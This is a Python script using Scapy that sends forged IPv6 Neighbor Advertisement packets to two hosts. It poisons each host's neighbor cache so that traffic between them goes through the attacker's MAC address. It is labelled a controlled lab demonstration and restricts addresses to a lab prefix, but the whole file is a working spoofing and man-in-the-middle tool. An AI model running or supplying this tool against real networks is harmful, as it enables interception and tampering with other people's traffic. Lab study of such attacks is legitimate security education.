
#!/usr/bin/env python3

import argparse
import ipaddress
import re
import time

from scapy.all import (
    Ether,
    IPv6,
    ICMPv6ND_NA,
    ICMPv6NDOptDstLLAddr,
    get_if_hwaddr,
    sendp
)


def validate_mac(value):
    if not re.fullmatch(
        r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}",
        value
    ):
        raise ValueError(f"Invalid MAC address: {value}")

    return value.lower()


def build_na(claimed_ip, victim_ip, victim_mac, attacker_mac):
    return (
        Ether(
            src=attacker_mac,
            dst=victim_mac
        )
        /
        IPv6(
            src=claimed_ip,
            dst=victim_ip,
            hlim=255
        )
        /
        ICMPv6ND_NA(
            R=0,
            S=0,
            O=1,
            tgt=claimed_ip
        )
        /
        ICMPv6NDOptDstLLAddr(
            lladdr=attacker_mac
        )
    )


def main():
    parser = argparse.ArgumentParser(
        description="Controlled NA cache-poisoning demonstration"
    )

    parser.add_argument("--iface", required=True)
    parser.add_argument("--victim-a-ip", required=True)
    parser.add_argument("--victim-b-ip", required=True)
    parser.add_argument("--victim-a-mac", required=True)
    parser.add_argument("--victim-b-mac", required=True)
    parser.add_argument("--attacker-mac", default=None)
    parser.add_argument(
        "--prefix",
        default="2001:db8:10:1::/64"
    )
    parser.add_argument("--count", type=int, default=5)
    parser.add_argument("--interval", type=float, default=1.0)

    args = parser.parse_args()

    try:
        network = ipaddress.IPv6Network(args.prefix)
        ip_a = ipaddress.IPv6Address(args.victim_a_ip)
        ip_b = ipaddress.IPv6Address(args.victim_b_ip)

        mac_a = validate_mac(args.victim_a_mac)
        mac_b = validate_mac(args.victim_b_mac)

        attacker_mac = validate_mac(
            args.attacker_mac or get_if_hwaddr(args.iface)
        )

    except ValueError as exc:
        parser.error(str(exc))

    if ip_a == ip_b:
        parser.error("Victim addresses must be different")

    if ip_a not in network or ip_b not in network:
        parser.error("Victim addresses must belong to the lab prefix")

    if not 1 <= args.count <= 50 or args.interval < 0.2:
        parser.error("Invalid count or interval")

    # Poison B's cache entry for A.
    pkt_to_b = build_na(
        str(ip_a),
        str(ip_b),
        mac_b,
        attacker_mac
    )

    # Poison A's cache entry for B.
    pkt_to_a = build_na(
        str(ip_b),
        str(ip_a),
        mac_a,
        attacker_mac
    )

    print("Controlled NA spoofing experiment")
    print(f"Victim A: {ip_a} / {mac_a}")
    print(f"Victim B: {ip_b} / {mac_b}")
    print(f"Attacker MAC: {attacker_mac}")

    try:
        for i in range(args.count):
            sendp(pkt_to_b, iface=args.iface, verbose=False)
            sendp(pkt_to_a, iface=args.iface, verbose=False)

            print(f"Poisoning round {i + 1}/{args.count}")

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("Interrupted.")

    print("Experiment completed.")


if __name__ == "__main__":
    main()
